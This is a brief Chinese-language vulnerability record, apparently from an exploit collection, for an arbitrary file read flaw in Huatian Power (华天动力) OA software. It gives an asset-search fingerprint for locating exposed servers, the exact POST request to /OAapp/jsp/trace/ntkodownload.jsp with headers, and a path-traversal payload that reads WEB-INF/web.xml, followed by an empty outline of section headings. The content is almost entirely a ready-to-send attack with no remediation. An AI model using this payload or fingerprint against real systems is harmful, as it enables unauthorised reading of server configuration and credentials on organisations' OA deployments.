# 华天动力OAntkodownload存在任意文件读取漏洞

- **系统**：华天动力　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="华天软件 OA"`
- **请求**：`POST /OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 39`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
filename=../../../OAapp/WEB-INF/web.xml
```

**其他**
- 华天动力OA ntkodownload存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 华天动力OA